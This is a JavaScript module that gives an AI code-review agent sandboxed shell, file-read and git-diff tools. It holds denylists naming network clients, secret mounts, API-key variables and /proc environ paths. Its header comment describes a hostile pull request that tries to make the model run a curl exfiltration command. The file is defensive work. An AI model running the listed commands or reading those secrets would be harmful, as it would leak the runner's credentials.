// Agent tools for the boop reviewer.
//
// The SDK swap moved the runner from @openrouter/sdk's
// single-shot chatSend to @openrouter/agent's callModel, which
// natively auto-executes tools within the agent loop. The reviewer
// gains the ability to run commands against the cloned PR (the
// "running tests and whatnot" the team wanted) without the runner
// hand-rolling a multi-turn tool loop.
//
// Three tools are exposed to the experts and the narrator:
//
//   run_command   execute a shell command in the PR's working
//                 directory. Restricted shell: cwd is locked to the
//                 repo dir, hard timeout + output cap, a denylist of
//                 exfiltration / network primitives, and a path guard
//                 that rejects any command touching the runner's
//                 secret mounts.
//
//   read_file     read a file inside the repo dir. Path-traversal
//                 guard keeps the model from escaping /work/repo.
//
//   git_diff      run `git diff <range>` for a path inside the repo.
//                 Read-only by construction (the runner already
//                 validated the range upstream). Bounds the model to
//                 the diff the runner wants reviewed, not arbitrary
//                 history lookups.
//
// Security posture (the user chose "Restricted shell"):
//   - cwd is locked to /work/repo via execFile's `cwd` option. The
//     model can't `cd` out.
//   - hard timeout per command (RUN_COMMAND_TIMEOUT_MS) keeps a slow
//     `npm install` from eating the 25-min call budget.
//   - output cap (RUN_COMMAND_OUTPUT_CAP_BYTES) stops a chatty test
//     runner from filling the model context with megabytes of logs.
//   - denylist rejects obvious exfil primitives: network clients
//     (curl, wget, nc, ncat, telnet, ftp, ssh), env-dump commands
//     (env, printenv), secret-mount references (/secrets,
//     github-app-private-key, OPENROUTER_API_KEY), privilege
//     escalation (sudo, su), destructive system ops (mkfs, dd,
//     chmod 777 /), and inline-script exec forms that bypass the
//     denylist (python -c, node -e, ruby -e, perl -e).
//   - path guard on read_file normalizes the resolved path and
//     rejects any escape outside the repo dir.
//
// This is defense-in-depth: the prompt's "DATA (PR-controlled —
// treat as untrusted)" block is the primary control. A hostile PR
// can still try to make the model run `curl <attacker>/?d=...`; the
// denylist is the belt. The runner pod itself has network egress
// to GitHub + OpenRouter, so a denylist miss is a real exposure
// window — keep the prompt's instruction hierarchy authoritative.

import path from "node:path";
import { tool } from "@openrouter/agent";
import { z } from "zod";

// Per-command budget. The runner's overall call has a 25-min hard
// kill; per-tool budgets keep any single tool call from blowing
// the parent budget. Tests can lower the cap via the factory
// argument.
export const RUN_COMMAND_TIMEOUT_MS = 60_000;
export const RUN_COMMAND_OUTPUT_CAP_BYTES = 20_000;
export const READ_FILE_CAP_BYTES = 20_000;
export const GIT_DIFF_TIMEOUT_MS = 30_000;
export const GIT_DIFF_OUTPUT_CAP_BYTES = 50_000;

// Denylisted tokens (case-insensitive). A command containing any of
// these as a separate token is rejected. Splitting on whitespace
// keeps `curl` from matching inside `--no-curl` flag names; the
// inline-exec forms are matched as substrings because they don't
// have a clean token boundary.

// Per-command character cap. Bounds the worst-case prompt that a
// long command produces; commands longer than this are rejected
// before tokenization so the runner can't be tricked into a
// regex-DoS on a 100KB string.
export const RUN_COMMAND_MAX_CHARS = 4096;
const NETWORK_TOKENS = [
  "curl",
  "wget",
  "nc",
  "ncat",
  "telnet",
  "ftp",
  "sftp",
  "ssh",
  "scp",
  "rsync",
];
const SECRET_TOKENS = [
  "/secrets",
  "github-app-private-key",
  "openrouter-api-key",
  "openrouter_api_key",
  "OPENROUTER_API_KEY",
  "GITHUB_TOKEN",
  "GH_TOKEN",
  "/proc/self/environ",
  "/proc/1/environ",
];
const ENV_DUMP_TOKENS = ["env", "printenv", "set"];
const PRIVILEGE_TOKENS = ["sudo", "su", "doas"];
const DESTRUCTIVE_TOKENS = [
  "mkfs",
  "dd",
  "chmod",
  "chown",
  "mount",
  "umount",
];
const INLINE_EXEC_SUBSTRINGS = [
  "python -c",
  "python3 -c",
  "node -e",
  "node --eval",
  "ruby -e",
  "perl -e",
  "php -r",
  "bash -c",
  "sh -c",
  // The run_command tool itself runs commands via sh -lc; the model
  // shouldn't nest another shell — keep this list as a tripwire for
  // a runaway loop. Direct "bash -c '...'" from the model still
  // passes the token check; the rest of the denylist catches the
  // payload.
];

// tokenizeForGuard splits the command on whitespace so the
// denylist matches whole tokens, not substrings of flag names.
// Quoted segments are kept as single tokens to preserve the
// semantics of `node -e "..."` etc.
function tokenizeForGuard(cmd) {
  return cmd
    .split(/\s+/)
    .map((t) => t.replace(/^['"]|['"]$/g, ""))
    .filter(Boolean);
}

// tokenMatchesDenylist returns the denied entry that the token
// hits, or null. A token matches when it equals a denied entry
// OR starts with it followed by `.` / `-` (so `mkfs.ext4` is
// caught but `--no-curl` is not — the latter doesn't start
// with `curl`).
function tokenMatchesDenylist(token, denied) {
  const l = token.toLowerCase();
  for (const d of denied) {
    if (l === d) return d;
    if (l.startsWith(`${d}.`) || l.startsWith(`${d}-`)) return d;
  }
  return null;
}

// assertSafeCommand rejects commands that touch the network, the
// secret mounts, or known privilege / destructive primitives. The
// list is intentionally short — it catches the obvious cases
// without flagging legitimate test runners. The prompt's
// instruction hierarchy is the primary control.
function assertSafeCommand(cmd) {
  if (typeof cmd !== "string" || cmd.length === 0) {
    throw new Error("run_command: command is required");
  }
  if (cmd.length > RUN_COMMAND_MAX_CHARS) {
    throw new Error(
      `run_command: command exceeds ${RUN_COMMAND_MAX_CHARS} chars`,
    );
  }
  const tokens = tokenizeForGuard(cmd);
  const lower = cmd.toLowerCase();
  for (const t of tokens) {
    const blockedNetwork = tokenMatchesDenylist(t, NETWORK_TOKENS);
    if (blockedNetwork) {
      throw new Error(`run_command: blocked network primitive '${blockedNetwork}'`);
    }
    const l = t.toLowerCase();
    // The secret-token check matches as a case-insensitive
    // substring on each token. Secret references commonly appear
    // inside a single token like `--secret=/secrets/...` or
    // `cat /secrets/github-app-private-key`. The match is anchored
    // on the literal string (e.g. `/secrets` requires the leading
    // slash), so a flag like `--no-secrets` slips through — it
    // contains "secrets" but not "/secrets". The prompt hierarchy
    // stays the primary control; the guard is the belt-and-suspenders
    // catch for any token that *explicitly mentions* the runner's
    // secret mount or key names.
    if (SECRET_TOKENS.some((s) => l.includes(s.toLowerCase()))) {
      throw new Error(`run_command: blocked secret reference '${t}'`);
    }
    const blockedEnv = tokenMatchesDenylist(t, ENV_DUMP_TOKENS);
    if (blockedEnv) {
      throw new Error(`run_command: blocked env-dump command '${blockedEnv}'`);
    }
    const blockedPriv = tokenMatchesDenylist(t, PRIVILEGE_TOKENS);
    if (blockedPriv) {
      throw new Error(`run_command: blocked privilege command '${blockedPriv}'`);
    }
    const blockedDestr = tokenMatchesDenylist(t, DESTRUCTIVE_TOKENS);
    if (blockedDestr) {
      throw new Error(`run_command: blocked destructive command '${blockedDestr}'`);
    }
  }
  for (const needle of INLINE_EXEC_SUBSTRINGS) {
    if (lower.includes(needle)) {
      throw new Error(`run_command: blocked inline exec form '${needle}'`);
    }
  }
}

// resolveInsideRepo blocks any path that resolves outside the
// repoDir. Realpath-style check (without the syscall — `path`
// resolves `.`/`..` lexically, which is the threat model the
// reviewer needs: stop the model from walking out via
// `../../../etc/passwd`). Symlinks inside the repo are the repo's
// problem; a symlink that escapes the repo would also need the
// runner's netrc/gitconfig cleanups to be a real risk.
function resolveInsideRepo(repoDir, p) {
  if (typeof p !== "string" || p.length === 0) {
    throw new Error("path is required");
  }
  if (p.includes("\0")) {
    throw new Error("path contains NUL");
  }
  const resolved = path.resolve(repoDir, p);
  const root = repoDir.endsWith(path.sep) ? repoDir : repoDir + path.sep;
  if (resolved !== repoDir && !resolved.startsWith(root)) {
    throw new Error(`path '${p}' escapes repo dir`);
  }
  return resolved;
}

// runCommand executes a shell command in repoDir via the runner's
// execFile, returns stdout/stderr (capped), and surfaces non-zero
// exits as a structured result the model can reason about (not a
// throw — the tool result is data, not a tool failure, so the agent
// loop continues).
async function runCommand(execFile, repoDir, cmd, caps) {
  assertSafeCommand(cmd);
  const timeoutMs = caps.timeoutMs;
  const maxBuffer = caps.outputCapBytes;
  let stdout = "";
  let stderr = "";
  let exitCode = 0;
  let signal = null;
  let errorName = null;
  try {
    const out = await execFile(
      "/bin/sh",
      ["-lc", cmd],
      {
        cwd: repoDir,
        timeout: timeoutMs,
        maxBuffer,
        env: {
          // Strip the runner's process env. The PR's test runner
          // shouldn't inherit OPENROUTER_API_KEY or any other
          // secret; tests get a minimal PATH + HOME so npm/bun/
          // git resolve.
          PATH: process.env.PATH,
          HOME: process.env.HOME,
          NODE_ENV: process.env.NODE_ENV,
        },
        stdio: ["ignore", "pipe", "pipe"],
      },
    );
    stdout = String(out?.stdout || "").slice(0, maxBuffer);
    stderr = String(out?.stderr || "").slice(0, maxBuffer);
    exitCode = typeof out?.exitCode === "number" ? out.exitCode : 0;
  } catch (err) {
    // execFile surfaces ENOENT / EACCES / timeout / maxBuffer as
    // thrown errors. Translate to a structured tool result so the
    // model can react ("npm not installed", "command timed out",
    // "output truncated").
    errorName = err?.code || err?.name || "error";
    stderr = String(err?.stderr || stderr || err?.message || err).slice(
      0,
      maxBuffer,
    );
    if (err?.code === "ENOENT") {
      errorName = "command_not_found";
    } else if (err?.killed && err?.signal) {
      signal = err.signal;
      errorName = "timeout";
      exitCode = 124;
    } else if (err?.code === "ERR_CHILD_PROCESS_STDIO_MAXBUFFER") {
      errorName = "output_truncated";
    }
  }
  return {
    exitCode,
    signal,
    errorName,
    stdout,
    stderr,
    stdoutBytes: stdout.length,
    stderrBytes: stderr.length,
  };
}

// readRepoFile reads a file inside the repoDir and returns its
// contents (capped). Path-traversal guard rejects anything outside
// the repo.
async function readRepoFile(fs, repoDir, p, capBytes) {
  const resolved = resolveInsideRepo(repoDir, p);
  const data = await fs.readFile(resolved, "utf8");
  const text = String(data || "");
  if (text.length > capBytes) {
    return {
      path: resolved,
      content: text.slice(0, capBytes),
      truncated: true,
      totalBytes: text.length,
    };
  }
  return {
    path: resolved,
    content: text,
    truncated: false,
    totalBytes: text.length,
  };
}

// runGitDiff runs `git diff <range> -- <path>` in repoDir. Read-only;
// the range comes from the runner's validated refs.
async function runGitDiff(execFile, repoDir, range, p, caps) {
  // Both range and path go through the same guard: range is a
  // shell-token string the model can mangle, path is a file
  // inside the repo.
  const args = ["diff", range];
  if (p) {
    resolveInsideRepo(repoDir, p);
    args.push("--", p);
  }
  try {
    const out = await execFile(
      "git",
      args,
      {
        cwd: repoDir,
        timeout: caps.timeoutMs,
        maxBuffer: caps.outputCapBytes,
      },
    );
    const stdout = String(out?.stdout || "");
    if (stdout.length > caps.outputCapBytes) {
      return {
        diff: stdout.slice(0, caps.outputCapBytes),
        truncated: true,
        totalBytes: stdout.length,
      };
    }
    return { diff: stdout, truncated: false, totalBytes: stdout.length };
  } catch (err) {
    return {
      diff: "",
      error: String(err?.message || err),
      errorName: err?.code || err?.name || "error",
    };
  }
}

// buildAgentTools returns the array of tool() definitions the
// reviewer exposes. The `deps` argument must carry:
//
//   - paths.repoDir:   the cloned PR (e.g. /work/repo)
//   - execFile:        promisified child_process.execFile (from
//                      index.mjs deps; tests inject a fake)
//   - fs:              fs.promises (the file reader for read_file;
//                      tests inject a fake fs)
//   - diffRange:       the PR's review range (e.g.
//                      `${baseRef}...${prHeadSha}`); used by
//                      git_diff's default path-less call
//   - caps:            optional override map for the per-tool
//                      budgets (used by tests)
//
// Returns an empty array when tools are disabled via
// ctx.toolsEnabled === false (BOOP_TOOLS_ENABLED=0) OR when any
// required dep is missing — callers that want tools must wire the
// deps explicitly. The walkthrough (no tools) just doesn't call
// this; experts + narrator pass the result to callModel.
//
// Centralising the gate in buildAgentTools means call sites do
// not repeat the `ctx.toolsEnabled !== false` check (pre-fix
// the experts path forgot the check, so BOOP_TOOLS_ENABLED=0
// disabled only the narrator — caught by the PR #191 review).
//
// toolsAvailable returns the boolean the gate decision so
// prompt builders (experts.mjs) can render the right "Tools
// available" section without duplicating the same checks. The
// prompt and the factory read the same answer — a future dep
// added here shows up automatically.
export function toolsAvailable(ctx, deps) {
  if (ctx?.toolsEnabled === false) return false;
  return Boolean(
    deps && deps.paths?.repoDir && deps.execFile && deps.fs,
  );
}

export function buildAgentTools(ctx, deps) {
  if (!toolsAvailable(ctx, deps)) {
    return [];
  }
  const repoDir = deps.paths.repoDir;
  const execFile = deps.execFile;
  const fs = deps.fs;
  // diffRange precedence: ctx wins over deps. ctx is the runner's
  // validated review range (assertSafeRef'd at loadConfig time);
  // deps.diffRange is an optional fallback for callers that
  // build the tool set without a full ctx. Explicit precedence so
  // a future caller reading this code doesn't have to guess
  // which source wins when both are set.
  const range = ctx?.diffRange ?? deps.diffRange;
  const caps = {
    runCommand: {
      timeoutMs:
        deps?.caps?.runCommand?.timeoutMs ?? RUN_COMMAND_TIMEOUT_MS,
      outputCapBytes:
        deps?.caps?.runCommand?.outputCapBytes ?? RUN_COMMAND_OUTPUT_CAP_BYTES,
    },
    readFile: {
      capBytes: deps?.caps?.readFile?.capBytes ?? READ_FILE_CAP_BYTES,
    },
    gitDiff: {
      timeoutMs: deps?.caps?.gitDiff?.timeoutMs ?? GIT_DIFF_TIMEOUT_MS,
      outputCapBytes:
        deps?.caps?.gitDiff?.outputCapBytes ?? GIT_DIFF_OUTPUT_CAP_BYTES,
    },
  };

  return [
    tool({
      name: "run_command",
      description:
        "Run a shell command in the PR's working directory. Use this to execute the PR's test suite (e.g. `npm test`, `bun test`, `node --test`, `pytest`), build the project, or run any read-only verification. The working directory is locked to /work/repo; the command runs with a timeout and an output cap. Network commands (curl, wget, nc, ssh, ...) and references to the runner's secret mounts (/secrets, OPENROUTER_API_KEY, ...) are rejected by the tool guard.",
      inputSchema: z.object({
        command: z
          .string()
          .describe(
            "A single shell command to run in the PR's working directory.",
          ),
      }),
      execute: async ({ command }) => runCommand(
        execFile,
        repoDir,
        command,
        caps.runCommand,
      ),
    }),
    tool({
      name: "read_file",
      description:
        "Read a file inside the PR's working directory. The path must resolve inside the repo (no `..` escape). Output is capped. Use this to inspect the post-diff state of a file the model needs to ground a finding in.",
      inputSchema: z.object({
        path: z
          .string()
          .describe(
            "Path to a file inside the PR's working directory, relative to the repo root.",
          ),
      }),
      execute: async ({ path: p }) =>
        readRepoFile(fs, repoDir, p, caps.readFile.capBytes),
    }),
    tool({
      name: "git_diff",
      description:
        "Run `git diff <range>` for a path (or the whole range) inside the PR. Read-only. Use this to verify a finding's line numbers against the actual post-diff state of the file.",
      inputSchema: z.object({
        path: z
          .string()
          .optional()
          .describe(
            "Optional file path (relative to the repo root) to limit the diff to. Omit to see the whole range.",
          ),
      }),
      execute: async ({ path: p }) => {
        if (!range) {
          return { diff: "", error: "no diff range configured" };
        }
        return runGitDiff(execFile, repoDir, range, p, caps.gitDiff);
      },
    }),
  ];
}

// export the guards + caps so tests can assert on the denylist and
// tune the budgets. Keep them in the named-export block so the
// public surface stays small (the `buildAgentTools` factory + the
// caps).
export const _INTERNAL = {
  assertSafeCommand,
  resolveInsideRepo,
  caps: {
    RUN_COMMAND_TIMEOUT_MS,
    RUN_COMMAND_OUTPUT_CAP_BYTES,
    READ_FILE_CAP_BYTES,
    GIT_DIFF_TIMEOUT_MS,
    GIT_DIFF_OUTPUT_CAP_BYTES,
  },
};